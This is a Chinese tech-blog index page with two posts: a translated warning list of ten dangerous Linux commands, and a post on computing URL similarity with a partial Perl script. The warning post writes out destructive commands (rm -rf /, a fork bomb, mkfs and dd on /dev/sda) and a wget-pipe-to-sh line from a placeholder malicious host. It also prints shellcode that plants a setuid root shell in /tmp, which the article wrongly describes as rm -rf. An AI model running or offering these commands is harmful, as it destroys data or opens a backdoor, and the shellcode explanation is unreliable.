<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"www.veitor.net","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"default"},"prism":{"light":"prism-tomorrow.min","dark":"prism-tomorrow.min"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
<meta property="og:type" content="website">
<meta property="og:title" content="Veitor的技术博客">
<meta property="og:url" content="http://www.veitor.net/page/8/index.html">
<meta property="og:site_name" content="Veitor的技术博客">
<meta property="og:description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Veitor">
<meta property="article:tag" content="php,CQRS,DDD,Event Sourcing,linux,Yii,kubernetes,golang,docker">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://www.veitor.net/page/8/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/8/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Veitor的技术博客</title>
  

  <script src="/js/third-party/analytics/baidu-analytics.js" defer></script>
  <script async src="https://hm.baidu.com/hm.js?c422d42123239fdefb0180ed522d050a"></script>







  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/components/prism-core.min.js" integrity="sha256-bKrTFt2ZHyT4AE4LnBnAVctYKf9l6XP77kBvltgbjn4=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha256-AjM0J5XIbiB590BrznLEgZGLnOQWrt62s3BEq65Q/I0=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha256-9cmf7tcLdXpKsPi/2AWE93PbZpTp4M4tqzFk+lWomjU=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>



  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Veitor的技术博客</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-首页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Veitor"
      src="/avatar.jpg">
  <p class="site-author-name" itemprop="name">Veitor</p>
  <div class="site-description" itemprop="description">关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">90</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">62</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/veitor" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;veitor" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/veitor" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;veitor" rel="noopener me" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/Veitor_424" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Veitor_424" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/10-most-dangerous-commands-to-never-execute-in-Linux/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/10-most-dangerous-commands-to-never-execute-in-Linux/" class="post-title-link" itemprop="url">永远不要在 Linux 执行的 10 个最危险的命令</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-07-17 02:49:25" itemprop="dateCreated datePublished" datetime="2014-07-17T02:49:25+08:00">2014-07-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">计算机系统</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正 在做什么时候。这篇文章并不打算引来你对Linux或linux 命令行的愤怒。我们只是想让你意识到在你运行某些命令时应该三思而后行。（译注：当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普 通用户身份下，破坏的只是自己的一亩三分地。） <a target="_blank" rel="noopener" href="http://storage.veitor.net/uploads/2014/07/08063106_Sreu.jpg"><img data-src="http://storage.veitor.net/uploads/2014/07/08063106_Sreu.jpg" alt="08063106_Sreu"></a> <strong>1. rm -rf 命令</strong> rm -rf命令是删除文件夹及其内容最快的方式之一。仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。下列是一些rm 命令的选项。</p>
<ul>
<li>rm　命令在Linux下通常用来删除文件。</li>
<li>rm -r 命令递归的删除文件夹，甚至是空的文件夹。（译注：个人认为此处应该是说错了，从常识看，应该是“甚至是非空的文件夹”）</li>
<li>rm -f 命令能不经过询问直接删除‘只读文件’。（译注：Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数 只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来 要求删除确认，而-f则抑制了这个提示。）</li>
<li>rm -rf &#x2F; : 强制删除根目录下所有东东。（就是说删除完毕后，什么也没有了。。。）</li>
<li>rm -rf *:　强制删除当前目录的所有文件。</li>
<li>rm -rf . : 强制删除当前文件夹及其子文件夹。</li>
</ul>
<p>从 现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好 你在做什么！译者本人有着血泪的教训啊。） <strong>2. :(){:|:&amp;};: 命令</strong> 这就是个fork 炸弹的实例。具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。 :(){:|:&amp;};: 哦？你确认你要试试么？千万别在公司正式的服务器上实验啊~~ <strong>3. 命令　&gt; &#x2F;dev&#x2F;sda</strong> 上列命令会将某个‘命令‘的输出写到块设备&#x2F;dev&#x2F;sda中。该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。 <strong>4. mv 文件夹 &#x2F;dev&#x2F;null</strong> 这 个命令会移动某个‘文件夹‘到&#x2F;dev&#x2F;null。在Linux中 &#x2F;dev&#x2F;null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。（译注：这就是黑洞啊。当然，要说明的是，通过将文件夹移动到黑洞，并不能阻止 数据恢复软件的救赎，所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成——我知道你肯定有些东西想删除得干干净净的。） # mv &#x2F;home&#x2F;user&#x2F;* &#x2F;dev&#x2F;null 上列命令会将User目录所有内容移动到&#x2F;dev&#x2F;null，这意味着所有东西都被‘卷入’黑洞　(null)之中。 <strong>5. wget <a target="_blank" rel="noopener" href="http://malicious_source/">http://malicious_source</a> -O- | sh</strong> 上列命令会从一个（也许是）恶意源下载一个脚本并执行。Wget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。 注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本&#x2F;程序。（译注：所以，你真的知道你在做什么吗？当遇到这种需要是，我的做法是，先wget下来，然后我去读一读其中到底写了些什么，然后考虑是否执行。） <strong>6. mkfs.ext3 &#x2F;dev&#x2F;sda</strong> 上列命令会格式化块设备‘sda’，你无疑知道在执行上列命令后你的块设备(硬盘驱 动器)会被格式化，崭新的!没有任何数据，直接让你的系统达到不可恢复的阶段。（译注：通常不会直接使用&#x2F;dev&#x2F;sda这样的设备，除非是作为raw设 备使用，一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁 灭性的，上面的数据都会被蒸发了。） <strong>7. &gt; file</strong> 上列命令常用来清空文件内容（译注：通常也用于记录命令输出。 不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。另外，我想你可能真正想用的是 “&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。）。如果用上列执行时输入错误或无知的输入类似 “&gt;xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。 <strong>8. ^foo^bar</strong> 这个命令在我们<a target="_blank" rel="noopener" href="http://linux.cn/article-2284-1.html">十个鲜为人知的 Linux 命令 – Part 3</a>中描述过，用来编辑先前运行的命令而无需重打整个命令。但当用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。（译注：事实上，这种小技巧是译者认为的，少数史前时代遗留下来的无用而有害的“黑客”技巧。） <strong>9. dd if&#x3D;&#x2F;dev&#x2F;random of&#x3D;&#x2F;dev&#x2F;sda</strong> 上列命令会向块设备sda写入随机的垃圾文件从而擦出数据。当然！你的系统可能陷入混乱和不可恢复的状态。（译注：记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。） <strong>10. 隐藏命令</strong> 下面的命令其实就是上面第一个命令 (rm -rf)。这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄。在终端里运行下面命令可能会擦除你的根分区。 这个命令表明通常真正的危险是隐藏的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。不要编译／运行从未知来源的代码。</p>
<p>char esp[] __attribute__ ((section(“.text”))) &#x2F;* e.s.prelease *&#x2F;&#x3D; “\xeb\x3e\x5b\x31\xc0<br>\x50\x54\x5a\x83\xec\x64\x68″“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″“<br>\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″“\x56\x04\xf7\x56\x08\xf7\x56<br>\x0c\x83\xc4\x74\x56″“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″“\xc0<br>\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″“\x6e\x2f\x73\x68\x00\x2d\x63<br>\x00″“cp -p &#x2F;bin&#x2F;sh &#x2F;tmp&#x2F;.beyond; chmod 4755&#x2F;tmp&#x2F;.beyond;”;</p>
<p>注意: 不要在你的或你的同学或学校的电脑里的Linux终端或Shell执行以上的任何一个命令。如果你想测试它们，请在虚拟机上运行。任何不和谐或数据丢失，由于运行上面的命令导致你的系统崩溃，文章作者和Tecmint概不负责。（译注：译者和转载网站也不负责~！）</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/URL-similarity-calculation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/URL-similarity-calculation/" class="post-title-link" itemprop="url">URL相似度计算的思考</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-07-17 00:59:35" itemprop="dateCreated datePublished" datetime="2014-07-17T00:59:35+08:00">2014-07-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/" itemprop="url" rel="index"><span itemprop="name">经验分享</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在做一些web相关的工作的时候，我们往往可能需要做一些对url的处理，其中包括对相似的url的识别和处理。这就需要计算两个url的相似度。 那么怎么进行url相似度的计算的？我首先想到的是把一个url看作是一个字符串，这样就简化成两个字符串相似度的计算。字符串相似度计算有很多已经比较成熟的算法，比如“<a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Levenshtein_Distance">编辑距离算法</a>”，该算法描述了两个字符串之间转换需要的最小的编辑次数；还有一些其他的比如“<a target="_blank" rel="noopener" href="http://www.cnblogs.com/dartagnan/archive/2011/10/06/2199764.html">最长公共字串</a>”等方法。但这些方法对于url相似度的计算来说是不是够了呢？比如给以下三个url： url1: <a target="_blank" rel="noopener" href="http://www.spongeliu.com/xxx/123.html">www.spongeliu.com/xxx/123.html</a> url2: <a target="_blank" rel="noopener" href="http://www.spongeliu.com/xxx/456.html">www.spongeliu.com/xxx/456.html</a> url3: <a target="_blank" rel="noopener" href="http://www.spongeliu.com/xxx/abc.html">www.spongeliu.com/xxx/abc.html</a> 这三个url的编辑距离是一致的，但是直观上我们却认为url1和url2更加相似一些。 再比如我们要判断两个站点是否同一套建站模版建立的，抽出两个url如下这样： url1: <a target="_blank" rel="noopener" href="http://www.163.com/go/artical/43432.html">www.163.com/go/artical/43432.html</a> url2: <a target="_blank" rel="noopener" href="http://www.sina.com.cn/go/artical/453109.html">www.sina.com.cn/go/artical/453109.html</a> 这两个url按照情景应该是相似的，这就超出了字符串相似度判断的能力范围。 </p>
<p>重新回到问题，要判断的是两个url的相似度，但是字符串的判断方法又不能很好应用。那么url和字符串的区别在哪里？这取决于如何定义相似的url。可以注意到，url比字符串含有更多的信息可以参考，因为url本身是包含<strong>结构和特征</strong>的，比如站点、目录。定义相似url的时候，是否要考虑站点？是否要考虑目录的一致？是否要考虑目录的深度？这取决于具体的需求。 考虑到url本身的结构，对其相似度的计算就可以抽象为对其关键特征相似度的计算。比如可以把站点抽象为一维特征，目录深度抽象为一维特征，一级目录、二级目录、尾部页面的名字也都可以抽象为一维特征。比如下面两个url: url1:  <a target="_blank" rel="noopener" href="http://www.spongeliu.com/go/happy/1234.html">http://www.spongeliu.com/go/happy/1234.html</a> url2:  <a target="_blank" rel="noopener" href="http://www.spongeliu.com/snoopy/tree/abcd.html">http://www.spongeliu.com/snoopy/tree/abcd.html</a> 先不定义他们是否相似，先来抽象一下他们的特征： </p>
<p>1、站点特征：如果两个url站点一样，则特征取值1，否则取值0； </p>
<p>2、目录深度特征：特征取值分别是两个url的目录深度是否一致； </p>
<p>3、一级目录特征：在这维特征的取值上，可以采用多种方法，比如如果一级目录名字相同则特征取1，否则取0；或者根据目录名字的编辑距离算出一个特征值； 或者根据目录名字的pattern，如是否数字、是否字母、是否字母数字穿插等。这取决于具体需求，这里示例仅仅根据目录名是否相同取1和0； </p>
<p>4、尾页面特征：这维特征的取值同一级目录，可以判断后缀是否相同、是否数字页、是否机器生成的随机字符串或者根据编辑长度来取值，具体也依赖于需求。这里示例仅仅判断最后一级目录的特征是否一致（比如是否都由数字组成、是否都有字母组成等）。 这样，对于这两个url就获得了4个维度的特征，分别是：1 1 0 0 。 有了这两个特征组合，就可以根据具体需求判断是否相似了。我们定义一下每个特征的重要程度，给出一个公式： similarity &#x3D; feather1 * x1 + feather2*x2 + feather3*x3 + feather4*x4; 其 中x表示对应特征的重要程度，比如我认为站点和目录都不重要，最后尾页面的特征才是最重要的，那么x1,x2,x3都可以取值为0，x4取值为 1，这样根据similarity就能得出是否相似了。或者认为站点的重要性占10%，目录深度占50%，尾页面的特征占40%，那么系数分别取值为 0.1\0.5\0\0.4即可。 其实这样找出需要的特征，可以把这个问题简化成一个机器学习的问题，只需要人为判断出一批url是否相似，用svm训练一下就可以达到机器判断的目的。 除了上面这种两个url相似度的判断，也可以将每一条url都抽象成一组特征，然后计算出一个url的得分，设置一个分数差的阈值，就可以达到从一大堆url中找出相似的url的目的。   下面的代码是perl编写的抽象两个url特征的脚本，这只是一个测试的脚本，难免有bug和丑陋的地方，仅供参考：</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl">#!&#x2F;usr&#x2F;bin&#x2F;perl
use strict;
use warnings;
my $url1 &#x3D; $ARGV\[0\];
my $url2 &#x3D; $ARGV\[1\];
my @array1 &#x3D; split( &#x2F;\\&#x2F;&#x2F;, $url1 );
my @array2 &#x3D; split( &#x2F;\\&#x2F;&#x2F;, $url2 );
#特征1：目录数
my $path1 &#x3D; @array1;
my $path2 &#x3D; @array2;
#print $path1, $path2;
#特征2：是否目录结尾
my $lastispath1 &#x3D; 0;
my $lastispath2 &#x3D; 0;
if( $url1 &#x3D;~ &#x2F;\\&#x2F;$&#x2F; )
&#123;
	$lastispath1 &#x3D; 1;
&#125;
if( $url1 &#x3D;~ &#x2F;\\&#x2F;$&#x2F; )
&#123;
	$lastispath2 &#x3D; 1;
&#125;</code></pre>
<p>#特征3：最后一级是否有后缀(htm,html,shtml等)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">my $len;
my $hassuffix1 &#x3D; 0;
my $hassuffix2 &#x3D; 0;
my $suffixstr;
my $laststr1 &#x3D; $array1\[$path1 - 1\];
my $laststr2 &#x3D; $array2\[$path2 - 1\];
my $issuffixsame &#x3D; 0;
if( $lastispath1 &#x3D;&#x3D; 0 )
&#123;
	my @suffix1 &#x3D; split( &#x2F;\\.&#x2F;, $array1\[$path1 - 1\]);
	if( @suffix1 &gt;&#x3D; 2 )
	&#123;
		$len &#x3D; rindex( $suffix1\[@suffix1 - 1\].&quot;\\$&quot;, &quot;\\$&quot;);
		if( $len &lt;&#x3D; 5 )
		&#123;
			$hassuffix1 &#x3D; 1;
			$suffixstr &#x3D; $suffix1\[@suffix1 - 1\];
			my $tmplen &#x3D; rindex( $array1\[@array1 - 1\].&quot;\\$&quot;, &quot;\\$&quot;);
			$laststr1 &#x3D; substr( $array1\[@array1 - 1\], 0, $tmplen-$len-1 );
		&#125;
	&#125;
&#125;
if( $lastispath2 &#x3D;&#x3D; 0 )
&#123;
	my @suffix2 &#x3D; split( &#x2F;\\.&#x2F;, $array2\[$path2 - 1\]);
	if( @suffix2 &gt;&#x3D; 2 )
	&#123;
		$len &#x3D; rindex( $suffix2\[@suffix2 - 1\].&quot;\\$&quot;, &quot;\\$&quot;);
		if( $len &lt;&#x3D; 5 )
		&#123;
			$hassuffix2 &#x3D; 1;
			if($suffixstr eq $suffix2\[@suffix2 - 1\])
			&#123;
				$issuffixsame &#x3D; 1;
			&#125;
			my $tmplen &#x3D; rindex( $array2\[@array2 - 1\].&quot;\\$&quot;, &quot;\\$&quot;);
			$laststr2 &#x3D; substr( $array2\[@array2 - 1\], 0, $tmplen-$len-1 );
		&#125;
	&#125;
&#125;</code></pre>
<p>#特征3：最后一级几个分隔符(通过特征匹配计算laststr1和laststr2相似度，如果仅计算字符串相似度，可以用编辑长度)</p>
<pre class="line-numbers language-none"><code class="language-none">my @area1 &#x3D; split(&#x2F;-&#x2F;, $laststr1);
my @area2 &#x3D; split(&#x2F;-&#x2F;, $laststr2);
my $i;
my $j;
my $totalarea1&#x3D;0;
my $totalarea2&#x3D;0;
my @patternarray1&#x3D;&#123;0&#125;;
my @patternarray2&#x3D;&#123;0&#125;;
my @splitarray1&#x3D;&#123;0&#125;;
my @splitarray2&#x3D;&#123;0&#125;;
#my $numarea1 &#x3D; @area2;
#print $laststr1,&quot; &quot;,$laststr2,&quot;\\n&quot;,$numarea1,&quot;\\n&quot;;
for ( $i &#x3D; 1; $i&lt;&#x3D;@area1; $i++ )
&#123;
	my @tmp1 &#x3D; split( &#x2F;_&#x2F;, $area1\[$i-1\]);
	for( $j &#x3D; 0; $j&lt;@tmp1; $j++)
	&#123;
		if( $tmp1\[$j\] &#x3D;~ &#x2F;^\\d+$&#x2F; )
		&#123;
			$patternarray1\[$totalarea1\] &#x3D; 1; #数字pattern
		&#125;
		elsif( $tmp1\[$j\] &#x3D;~ &#x2F;^\[a-zA-Z\]+$&#x2F;)
		&#123;
			$patternarray1\[$totalarea1\] &#x3D; 2; #纯字母pattern
		&#125;
		elsif( $tmp1\[$j\] &#x3D;~ &#x2F;^\[a-zA-Z\]+\[0-9\]+$&#x2F;)
		&#123;
			$patternarray1\[$totalarea1\] &#x3D; 3; #先字母后数字pattern
		&#125;
		elsif( $tmp1\[$j\] &#x3D;~ &#x2F;^\[0-9\]+\[a-zA-Z\]+$&#x2F;)
		&#123;
			$patternarray1\[$totalarea1\] &#x3D; 4; #先数字后字母pattern
		&#125;
		else
		&#123;
			$patternarray1\[$totalarea1\] &#x3D; 5; #其他pattern
		&#125;
		if( $j &#x3D;&#x3D; 0 )
		&#123;
			$splitarray1\[$totalarea1\]&#x3D;1;
		&#125;
		else
		&#123;
			$splitarray1\[$totalarea1\]&#x3D;2;
		&#125;
		$totalarea1 ++;
	&#125;
&#125;
for ( $i &#x3D; 1; $i&lt;&#x3D;@area2; $i++ )
&#123;
	my @tmp2 &#x3D; split( &#x2F;_&#x2F;, $area2\[$i-1\]);
	for( $j &#x3D; 0; $j&lt;@tmp2; $j++)
	&#123;
		if( $tmp2\[$j\] &#x3D;~ &#x2F;^\\d+$&#x2F; )
		&#123;
